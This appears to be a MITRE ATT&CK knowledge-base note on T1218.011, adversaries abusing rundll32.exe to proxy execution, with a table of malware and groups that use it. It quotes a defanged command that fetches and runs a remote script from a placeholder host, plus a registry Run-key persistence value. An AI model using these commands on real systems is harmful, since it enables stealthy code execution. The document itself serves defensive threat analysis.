---
aliases: 
    - T1218.011
mitre-attack: https://attack.mitre.org/techniques/T1218/011
tactic: 
     - Stealth
platforms:
     - Windows
permissions required:
     - none
---

## T1218.011

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: `rundll32.exe {DLLname, DLLfunction}`).<br><br>Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute.[^169]  For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.<br><br>Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"`  This behavior has been seen used by malware such as Poweliks.[^180] <br><br>Threat actors may also abuse legitimate, signed system DLLs (e.g., `zipfldr.dll, ieframe.dll`) with `rundll32.exe` to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.[^152] [^178] <br><br>Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading `ExampleFunction`). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.[^326] [^237]  DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`).<br><br>Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[^80]  


### Procedure Examples
| ID | Name | Use |
| --- | --- | --- |
| [[PcShare\|S1050]] | PcShare | [PcShare](https://attack.mitre.org/software/S1050) has used `rundll32.exe` for execution.[^171]  |
| [[Koadic\|S0250]] | Koadic | [Koadic](https://attack.mitre.org/software/S0250) can use Rundll32 to execute additional payloads.[^373]  |
| [[PowerDuke\|S0139]] | PowerDuke | [PowerDuke](https://attack.mitre.org/software/S0139) uses rundll32.exe to load.[^87]  |
| [[BLINDINGCAN\|S0520]] | BLINDINGCAN | [BLINDINGCAN](https://attack.mitre.org/software/S0520) has used Rundll32 to load a malicious DLL.[^255]  |
| [[Ninja\|S1100]] | Ninja | [Ninja](https://attack.mitre.org/software/S1100) loader components can be executed through rundll32.exe.[^233]  |
| [[Bumblebee\|S1039]] | Bumblebee | [Bumblebee](https://attack.mitre.org/software/S1039) has used `rundll32` for execution of the loader component.[^9] [^303]  |
| [[NOKKI\|S0353]] | NOKKI | [NOKKI](https://attack.mitre.org/software/S0353) has used rundll32 for execution.[^412]  |
| [[Backdoor.Oldrea\|S0093]] | Backdoor.Oldrea | [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) can use rundll32 for execution on compromised hosts.[^224]  |
| [[Emissary\|S0082]] | Emissary | Variants of [Emissary](https://attack.mitre.org/software/S0082) have used rundll32.exe in Registry values added to establish persistence.[^69]  |
| [[Matryoshka\|S0167]] | Matryoshka | [Matryoshka](https://attack.mitre.org/software/S0167) uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.[^409]  |
| [[Bad Rabbit\|S0606]] | Bad Rabbit | [Bad Rabbit](https://attack.mitre.org/software/S0606) has used rundll32 to launch a malicious DLL as `C:Windowsinfpub.dat`.[^7]  |
| [[EnvyScout\|S0634]] | EnvyScout | [EnvyScout](https://attack.mitre.org/software/S0634) has the ability to proxy execution of malicious files with Rundll32.[^275]  |
| [[GreyEnergy\|S0342]] | GreyEnergy | [GreyEnergy](https://attack.mitre.org/software/S0342) uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).[^163]  |
| [[Prikormka\|S0113]] | Prikormka | [Prikormka](https://attack.mitre.org/software/S0113) uses rundll32.exe to load its DLL.[^25]  |
| [[Squirrelwaffle\|S1030]] | Squirrelwaffle | [Squirrelwaffle](https://attack.mitre.org/software/S1030) has been executed using `rundll32.exe`.[^235] [^384]  |
| [[PolyglotDuke\|S0518]] | PolyglotDuke | [PolyglotDuke](https://attack.mitre.org/software/S0518) can be executed using rundll32.exe.[^240]  |
| [[FlawedAmmyy\|S0381]] | FlawedAmmyy | [FlawedAmmyy](https://attack.mitre.org/software/S0381) has used `rundll32` for execution.[^121]  |
| [[InvisiMole\|S0260]] | InvisiMole | [InvisiMole](https://attack.mitre.org/software/S0260) has used rundll32.exe for execution.[^52]  |
| [[Raspberry Robin\|S1130]] | Raspberry Robin | [Raspberry Robin](https://attack.mitre.org/software/S1130) uses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated with [Tor](https://attack.mitre.org/software/S0183) nodes.[^328]  |
| [[Mispadu\|S1122]] | Mispadu | [Mispadu](https://attack.mitre.org/software/S1122) uses RunDLL32 for execution via its injector DLL.[^321]  |
| [[IcedID\|S0483]] | IcedID | [IcedID](https://attack.mitre.org/software/S0483) has used rundll32.exe to execute the [IcedID](https://attack.mitre.org/software/S0483) loader.[^195] [^17]  |
| [[Ragnar Locker\|S0481]] | Ragnar Locker | [Ragnar Locker](https://attack.mitre.org/software/S0481) has used rundll32.exe to execute components of VirtualBox.[^239]  |
| [[FatDuke\|S0512]] | FatDuke | [FatDuke](https://attack.mitre.org/software/S0512) can execute via rundll32.[^240]  |
| [[NotPetya\|S0368]] | NotPetya | [NotPetya](https://attack.mitre.org/software/S0368) uses `rundll32.exe` to install itself on remote systems when accessed via [PsExec](https://attack.mitre.org/software/S0029) or `wmic`.[^33]  |
| [[PUNCHBUGGY\|S0196]] | PUNCHBUGGY | [PUNCHBUGGY](https://attack.mitre.org/software/S0196) can load a DLL using Rundll32.[^122]  |
| [[Pteranodon\|S0147]] | Pteranodon | [Pteranodon](https://attack.mitre.org/software/S0147) executes functions using rundll32.exe.[^297]  |
| [[CORESHELL\|S0137]] | CORESHELL | [CORESHELL](https://attack.mitre.org/software/S0137) is installed via execution of rundll32 with an export named "init" or "InitW."[^36]  |
| [[Bisonal\|S0268]] | Bisonal | [Bisonal](https://attack.mitre.org/software/S0268) has used rundll32.exe to execute as part of the Registry Run key it adds: `HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”`.[^267]  |
| [[Mongall\|S1026]] | Mongall | [Mongall](https://attack.mitre.org/software/S1026) can use `rundll32.exe` for execution.[^433]  |
| [[SVCReady\|S1064]] | SVCReady | [SVCReady](https://attack.mitre.org/software/S1064) has used `rundll32.exe` for execution.[^316]  |
| [[Elise\|S0081]] | Elise | After copying itself to a DLL file, a variant of [Elise](https://attack.mitre.org/software/S0081) calls the DLL file using rundll32.exe.[^342]  |
| [[USBferry\|S0452]] | USBferry | [USBferry](https://attack.mitre.org/software/S0452) can execute rundll32.exe in memory to avoid detection.[^383] 	 |
| [[Latrodectus\|S1160]] | Latrodectus | [Latrodectus](https://attack.mitre.org/software/S1160) can use rundll32.exe to execute downloaded DLLs.[^96] [^283]  |
| [[Briba\|S0204]] | Briba | [Briba](https://attack.mitre.org/software/S0204) uses rundll32 within [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) entries to execute malicious DLLs.[^95]  |
| [[EVILNUM\|S0568]] | EVILNUM | [EVILNUM](https://attack.mitre.org/software/S0568) can execute commands and scripts through rundll32.[^236]   |
| [[KONNI\|S0356]] | KONNI | [KONNI](https://attack.mitre.org/software/S0356) has used Rundll32 to execute its loader for privilege escalation purposes.[^213] [^88]  |
| [[gh0st RAT\|S0032]] | gh0st RAT | A [gh0st RAT](https://attack.mitre.org/software/S0032) variant has used rundll32 for execution.[^228]  |
| [[JHUHUGIT\|S0044]] | JHUHUGIT | [JHUHUGIT](https://attack.mitre.org/software/S0044) is executed using rundll32.exe.[^277] [^48]  |
| [[Attor\|S0438]] | Attor | [Attor](https://attack.mitre.org/software/S0438)'s installer plugin can schedule rundll32.exe to load the dispatcher.[^376]  |
| [[MegaCortex\|S0576]] | MegaCortex | [MegaCortex](https://attack.mitre.org/software/S0576) has used `rundll32.exe` to load a DLL for file encryption.[^41]  |
| [[StreamEx\|S0142]] | StreamEx | [StreamEx](https://attack.mitre.org/software/S0142) uses rundll32 to call an exported function.[^234]  |
| [[SDBbot\|S0461]] | SDBbot | [SDBbot](https://attack.mitre.org/software/S0461) has used rundll32.exe to execute DLLs.[^121]  |
| [[Mosquito\|S0256]] | Mosquito | [Mosquito](https://attack.mitre.org/software/S0256)'s launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.[^265]  |
| [[RTM\|S0148]] | RTM | [RTM](https://attack.mitre.org/software/S0148) runs its core DLL file using rundll32.exe.[^64] [^35]  |
| [[StrelaStealer\|S1183]] | StrelaStealer | [StrelaStealer](https://attack.mitre.org/software/S1183) DLL payloads have been executed via `rundll32.exe`.[^86] [^160]  |
| [[Sakula\|S0074]] | Sakula | [Sakula](https://attack.mitre.org/software/S0074) calls cmd.exe to run various DLL files via rundll32.[^144]  |
| [[Sibot\|S0589]] | Sibot | [Sibot](https://attack.mitre.org/software/S0589) has executed downloaded DLLs with `rundll32.exe`.[^230]  |
| [[Kapeka\|S1190]] | Kapeka | [Kapeka](https://attack.mitre.org/software/S1190) is a Windows DLL file executed via ordinal by `rundll32.exe`.[^302] [^14]  |
| [[Cobalt Strike\|S0154]] | Cobalt Strike | [Cobalt Strike](https://attack.mitre.org/software/S0154) can use `rundll32.exe` to load DLL from the command line.[^18] [^208] [^377]  |
| [[SUNBURST\|S0559]] | SUNBURST | [SUNBURST](https://attack.mitre.org/software/S0559) used Rundll32 to execute payloads.[^78]   |
| [[ServHelper\|S0382]] | ServHelper | [ServHelper](https://attack.mitre.org/software/S0382) contains a module for downloading and executing DLLs that leverages `rundll32.exe`.[^75]  |
| [[NativeZone\|S0637]] | NativeZone | [NativeZone](https://attack.mitre.org/software/S0637) has used rundll32 to execute a malicious DLL.[^415]  |
| [[FunnyDream\|S1044]] | FunnyDream | [FunnyDream](https://attack.mitre.org/software/S1044) can use `rundll32` for execution of its components.[^171]  |
| [[Kwampirs\|S0236]] | Kwampirs | [Kwampirs](https://attack.mitre.org/software/S0236) uses rundll32.exe in a Registry value added to establish persistence.[^398]  |
| [[BoomBox\|S0635]] | BoomBox | [BoomBox](https://attack.mitre.org/software/S0635) can use RunDLL32 for execution.[^275]  |
| [[DEADEYE\|S1052]] | DEADEYE | [DEADEYE](https://attack.mitre.org/software/S1052) can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.[^350]  |
| [[Egregor\|S0554]] | Egregor | [Egregor](https://attack.mitre.org/software/S0554) has used rundll32 during execution.[^402]  |
| [[FELIXROOT\|S0267]] | FELIXROOT | [FELIXROOT](https://attack.mitre.org/software/S0267) uses Rundll32 for executing the dropper program.[^106] [^163]  |
| [[ZxShell\|S0412]] | ZxShell | [ZxShell](https://attack.mitre.org/software/S0412) has used rundll32.exe to execute other DLLs and named pipes.[^307]   |
| [[DDKONG\|S0255]] | DDKONG | [DDKONG](https://attack.mitre.org/software/S0255) uses Rundll32 to ensure only a single instance of itself is running at once.[^434]  |
| [[Winnti for Windows\|S0141]] | Winnti for Windows | The [Winnti for Windows](https://attack.mitre.org/software/S0141) installer loads a DLL using rundll32.[^426] [^366]  |
| [[Troll Stealer\|S1196]] | Troll Stealer | [Troll Stealer](https://attack.mitre.org/software/S1196) is dropped as a DLL file and executed via `rundll32.exe` by its installer.[^286] [^37]  |
| [[Heyoka Backdoor\|S1027]] | Heyoka Backdoor | [Heyoka Backdoor](https://attack.mitre.org/software/S1027) can use rundll32.exe to gain execution.[^433]  |
| [[CozyCar\|S0046]] | CozyCar | The [CozyCar](https://attack.mitre.org/software/S0046) dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main [CozyCar](https://attack.mitre.org/software/S0046) component.[^279]  |
| [[QakBot\|S0650]] | QakBot | [QakBot](https://attack.mitre.org/software/S0650) has used Rundll32.exe to drop malicious DLLs including [Brute Ratel C4](https://attack.mitre.org/software/S1063) and to enable C2 communication.[^313] [^73] [^67] [^214] [^377]  |
| [[Comnie\|S0244]] | Comnie | [Comnie](https://attack.mitre.org/software/S0244) uses Rundll32 to load a malicious DLL.[^423]  |
| [[ADVSTORESHELL\|S0045]] | ADVSTORESHELL | [ADVSTORESHELL](https://attack.mitre.org/software/S0045) has used rundll32.exe in a Registry value to establish persistence.[^12]  |
| [[Flame\|S0143]] | Flame | Rundll32.exe is used as a way of executing [Flame](https://attack.mitre.org/software/S0143) at the command-line.[^140]  |
| [[HermeticWizard\|S0698]] | HermeticWizard | [HermeticWizard](https://attack.mitre.org/software/S0698) has the ability to create a new process using `rundll32`.[^369]  |
| [[Wizard Spider\|G0102]] | Wizard Spider | [Wizard Spider](https://attack.mitre.org/groups/G0102) has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.[^85]  |
| [[FIN7\|G0046]] | FIN7 | [FIN7](https://attack.mitre.org/groups/G0046) has used `rundll32.exe` to execute malware on a compromised network.[^250]   |
| [[UNC3886\|G1048]] | UNC3886 |  [UNC3886](https://attack.mitre.org/groups/G1048) has used rundll32.exe to execute MiniDump for dumping LSASS process memory.[^211]  |
| [[Lazarus Group\|G0032]] | Lazarus Group | [Lazarus Group](https://attack.mitre.org/groups/G0032) has used rundll32 to execute malicious payloads on a compromised host.[^408]  |
| [[Aquatic Panda\|G0143]] | Aquatic Panda | [Aquatic Panda](https://attack.mitre.org/groups/G0143) used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.[^139]  |
| [[Daggerfly\|G1034]] | Daggerfly | [Daggerfly](https://attack.mitre.org/groups/G1034) proxied execution of malicious DLLs through a renamed rundll32.exe binary.[^296]  |
| [[TA505\|G0092]] | TA505 | [TA505](https://attack.mitre.org/groups/G0092) has leveraged `rundll32.exe` to execute malicious DLLs.[^158] [^75]  |
| [[Kimsuky\|G0094]] | Kimsuky | [Kimsuky](https://attack.mitre.org/groups/G0094) has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.[^362] [^90]  |
| [[Sandworm Team\|G0034]] | Sandworm Team | [Sandworm Team](https://attack.mitre.org/groups/G0034) used a backdoor which could execute a supplied DLL using rundll32.exe.[^131] 	 |
| [[APT28\|G0007]] | APT28 | [APT28](https://attack.mitre.org/groups/G0007) executed [CHOPSTICK](https://attack.mitre.org/software/S0023) by using rundll32 commands such as `rundll32.exe “C:\Windows\twain_64.dll”`. [APT28](https://attack.mitre.org/groups/G0007) also executed a .dll for a first stage dropper using rundll32.exe. An [APT28](https://attack.mitre.org/groups/G0007) loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[^116] [^12] [^266] [^162] [^184] [^380]  |
| [[Magic Hound\|G0059]] | Magic Hound | [Magic Hound](https://attack.mitre.org/groups/G0059) has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.[^226]  |
| [[HAFNIUM\|G0125]] | HAFNIUM | [HAFNIUM](https://attack.mitre.org/groups/G0125) has used `rundll32` to load malicious DLLs.[^186]  |
| [[MuddyWater\|G0069]] | MuddyWater | [MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.[^395]  |
| [[APT38\|G0082]] | APT38 | [APT38](https://attack.mitre.org/groups/G0082) has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.[^393] [^202]  |
| [[APT32\|G0050]] | APT32 | [APT32](https://attack.mitre.org/groups/G0050) malware has used rundll32.exe to execute an initial infection process.[^397]  |
| [[Storm-0501\|G1053]] | Storm-0501 | [Storm-0501](https://attack.mitre.org/groups/G1053) has launched [Cobalt Strike](https://attack.mitre.org/software/S0154) Beacon files with rundll32.exe.[^305]  |
| [[APT19\|G0073]] | APT19 | [APT19](https://attack.mitre.org/groups/G0073) configured its payload to inject into the rundll32.exe.[^45]  |
| [[APT41\|G0096]] | APT41 | [APT41](https://attack.mitre.org/groups/G0096) has used rundll32.exe to execute a loader.[^231]  |
| [[Blue Mockingbird\|G0108]] | Blue Mockingbird | [Blue Mockingbird](https://attack.mitre.org/groups/G0108) has executed custom-compiled XMRIG miner DLLs using rundll32.exe.[^223]  |
| [[RedCurl\|G1039]] | RedCurl | [RedCurl](https://attack.mitre.org/groups/G1039) has used rundll32.exe to execute malicious files.[^263] [^332] [^417]   |
| [[Gamaredon Group\|G0047]] | Gamaredon Group | [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware has used rundll32 to launch additional malicious components.[^102]  |
| [[TA551\|G0127]] | TA551 | [TA551](https://attack.mitre.org/groups/G0127) has used rundll32.exe to load malicious DLLs.[^46]  |
| [[APT3\|G0022]] | APT3 | [APT3](https://attack.mitre.org/groups/G0022) has a tool that can run DLLs.[^229]  |
| [[Carbanak\|G0008]] | Carbanak | [Carbanak](https://attack.mitre.org/groups/G0008) installs VNC server software that executes through rundll32.[^84]  |
| [[LazyScripter\|G0140]] | LazyScripter | [LazyScripter](https://attack.mitre.org/groups/G0140) has used `rundll32.exe` to execute [Koadic](https://attack.mitre.org/software/S0250) stagers.[^74]   |
| [[CopyKittens\|G0052]] | CopyKittens | [CopyKittens](https://attack.mitre.org/groups/G0052) uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[^293]  |




### Mitigations
| ID | Name | Descrption |
| --- | --- | --- |
| [[Exploit Protection\|M1050]] | Exploit Protection | Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control. |




### Sub-techniques
| ID | Name |
| --- | --- |
| [[Rundll32\|T1218.011]] | Rundll32 |



## References

[^1]: [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


[^2]: [GitHub Bloodhound](https://github.com/BloodHoundAD/BloodHound)


[^3]: [Microsoft Driver Block Rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)


[^4]: [SANS Application Whitelisting](https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599)


[^5]: [Github UACMe](https://github.com/hfiref0x/UACME)


[^6]: [Microsoft Disable DCOM](https://technet.microsoft.com/library/cc771387.aspx)


[^7]: [Secure List Bad Rabbit](https://securelist.com/bad-rabbit-ransomware/82851/)


[^8]: [Microsoft Enable Cred Guard April 2017](https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-manage)


[^9]: [Proofpoint Bumblebee April 2022](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming)


[^10]: [Sygnia ESXi Ransomware 2024](https://www.sygnia.co/blog/esxi-ransomware-attacks/)


[^11]: [Microsoft Manage Mail Flow Rules 2023](https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/manage-mail-flow-rules)


[^12]: [Bitdefender APT28 Dec 2015](https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf)


[^13]: [Okta DPoP 2023](https://www.okta.com/blog/2023/06/a-leap-forward-in-token-security-okta-adds-support-for-dpop/)


[^14]: [WithSecure Kapeka 2024](https://labs.withsecure.com/content/dam/labs/docs/WithSecure-Research-Kapeka.pdf)


[^15]: [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)


[^16]: [Intel Hardware-based Security Technologies](https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/security-technologies-4th-gen-core-retail-paper.pdf)


[^17]: [DFIR_Quantum_Ransomware](https://thedfirreport.com/2022/04/25/quantum-ransomware/)


[^18]: [Cobalt Strike Manual 4.3 November 2020](https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf)


[^19]: [Kubernetes RBAC](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)


[^20]: [Mandiant M-Trends 2020](https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf)


[^21]: [Google Workspace Data Loss Prevention](https://support.google.com/a/answer/9646351)


[^22]: [TechNet Applocker vs SRP](https://technet.microsoft.com/en-us/library/ee791851.aspx)


[^23]: [TechNet Scheduling Priority](https://technet.microsoft.com/library/dn221960.aspx)


[^24]: [SpecterOps Certified Pre Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)


[^25]: [ESET Operation Groundbait](http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf)


[^26]: [Unit 42 Palo Alto Ransomware in Public Clouds 2022](https://unit42.paloaltonetworks.com/ransomware-in-public-clouds/)


[^27]: [Microsoft SMB Packet Signing](https://docs.microsoft.com/en-us/previous-versions/system-center/operations-manager-2005/cc180803(v=technet.10))


[^28]: [create_sym_links](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links)


[^29]: [Broadcom Virtual Machine Guest Operations Privileges](https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/vsphere-security-7-0/defined-privileges/virtual-machine-guest-operations-privileges.html)


[^30]: [TrustedSec OOB Communications](https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response)


[^31]: [Dormann Dangers of VHD 2019](https://insights.sei.cmu.edu/cert/2019/09/the-dangers-of-vhd-and-vhdx-files.html)


[^32]: [Token tactics](https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/)


[^33]: [Talos Nyetya June 2017](https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html)


[^34]: [Unit 42 Global Incident Response Report 2026](https://www.paloaltonetworks.com/resources/research/unit-42-incident-response-report#:~:text=The%20Browser%20Attack%20Surface:%20Attacks%20at%20the%20Human%20Interface&text=The%20site%20used%20social-engineering,deployment%20and%20broader%20operational%20disruption)


[^35]: [Unit42 Redaman January 2019](https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman-banking-malware/)


[^36]: [Microsoft SIR Vol 19](http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf)


[^37]: [ASEC Troll Stealer 2024](https://asec.ahnlab.com/en/61934/)


[^38]: [Microsoft Install Password Filter n.d](https://msdn.microsoft.com/library/windows/desktop/ms721766.aspx)


[^39]: [site notifications - krebsonsecurity](https://krebsonsecurity.com/2020/11/be-very-sparing-in-allowing-site-notifications/)


[^40]: [Windows Anonymous Enumeration of SAM Accounts](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares)


[^41]: [IBM MegaCortex](https://securityintelligence.com/posts/from-mega-to-giga-cross-version-comparison-of-top-megacortex-modifications/)


[^42]: [Microsoft Tim McMichael Exchange Mail Forwarding 2](https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/)


[^43]: [Broadcom ESXi SSH](https://knowledge.broadcom.com/external/article/313767/allowing-ssh-access-to-vmware-vsphere-es.html)


[^44]: [TechNet Firewall Design](https://technet.microsoft.com/en-us/library/cc700828.aspx)


[^45]: [FireEye APT19](https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html)


[^46]: [Unit 42 TA551 Jan 2021](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/)


[^47]: [NSA and ASD Detect and Prevent Web Shells 2020](https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF)


[^48]: [Talos Seduploader Oct 2017](https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html)


[^49]: [win10_asr](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction)


[^50]: [Cider Security Top 10 CICD Security Risks](https://web.archive.org/web/20220316130828/https://www.cidersecurity.io/top-10-cicd-security-risks/)


[^51]: [Microsoft BEC Campaign](https://www.microsoft.com/security/blog/2021/06/14/behind-the-scenes-of-business-email-compromise-using-cross-domain-threat-data-to-disrupt-a-large-bec-infrastructure/)


[^52]: [ESET InvisiMole June 2020](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)


[^53]: [Microsoft WDAC](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)


[^54]: [Amazon  AWS Temporary Security Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html)


[^55]: [Microsoft AKS Azure AD 2023](https://learn.microsoft.com/en-us/azure/aks/managed-aad)


[^56]: [byt3bl33d3r NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


[^57]: [Mandiant Cloudy Logs 2023](https://www.mandiant.com/resources/blog/cloud-bad-log-configurations)


[^58]: [reagentc_cmd](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/reagentc-command-line-options?view=windows-11)


[^59]: [TechNet Moving Beyond EMET](https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/)


[^60]: [TechRepublic Wireless GPO FEB 2009](https://www.techrepublic.com/blog/data-center/configuring-wireless-settings-via-group-policy/)


[^61]: [DNS-msft](https://learn.microsoft.com/en-us/windows-server/networking/dns/deploy/dns-policies-overview)


[^62]: [Microsoft DDE Advisory Nov 2017](https://technet.microsoft.com/library/security/4053440)


[^63]: [Ars Technica Pwn2Own 2017 VM Escape](https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/)


[^64]: [ESET RTM Feb 2017](https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf)


[^65]: [Cisco IOS Software Integrity Assurance - Change Control](https://tools.cisco.com/security/center/resources/integrity_assurance.html#31)


[^66]: [Apple TN2459 Kernel Extensions](https://developer.apple.com/library/archive/technotes/tn2459/_index.html)


[^67]: [Cyberint Qakbot May 2021](https://blog.cyberint.com/qakbot-banking-trojan)


[^68]: [Microsoft - Device Registration](https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa)


[^69]: [Emissary Trojan Feb 2016](http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/)


[^70]: [SensePost Outlook Home Page](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)


[^71]: [US-CERT APT Energy Oct 2017](https://www.us-cert.gov/ncas/alerts/TA17-293A)


[^72]: [Browser-updates](https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates)


[^73]: [Red Canary Qbot](https://redcanary.com/threat-detection-report/threats/qbot/)


[^74]: [MalwareBytes LazyScripter Feb 2021](https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf)


[^75]: [Deep Instinct TA505 Apr 2019](https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload)


[^76]: [NSA MS AppLocker](https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm)


[^77]: [AdSecurity Kerberos GT Aug 2015](https://adsecurity.org/?p=1640)


[^78]: [Microsoft Deep Dive Solorigate January 2021](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)


[^79]: [Kifarunix - Task Scheduling in Linux](https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/)


[^80]: [rundll32.exe defense evasion](https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/)


[^81]: [Cisco Securing SNMP](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/20370-snmpsecurity-20370.html)


[^82]: [Chkrootkit Main](http://www.chkrootkit.org/)


[^83]: [ADSecurity Windows Secure Baseline](https://adsecurity.org/?p=3299)


[^84]: [Kaspersky Carbanak](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)


[^85]: [Mandiant FIN12 Oct 2021](https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf)


[^86]: [PaloAlto StrelaStealer 2024](https://unit42.paloaltonetworks.com/strelastealer-campaign/)


[^87]: [Volexity PowerDuke November 2016](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)


[^88]: [Malwarebytes Konni Aug 2021](https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/)


[^89]: [Mandiant Azure Run Command 2021](https://www.mandiant.com/resources/blog/azure-run-command-dummies)


[^90]: [Aryaka Kimsuky July 2025](https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf)


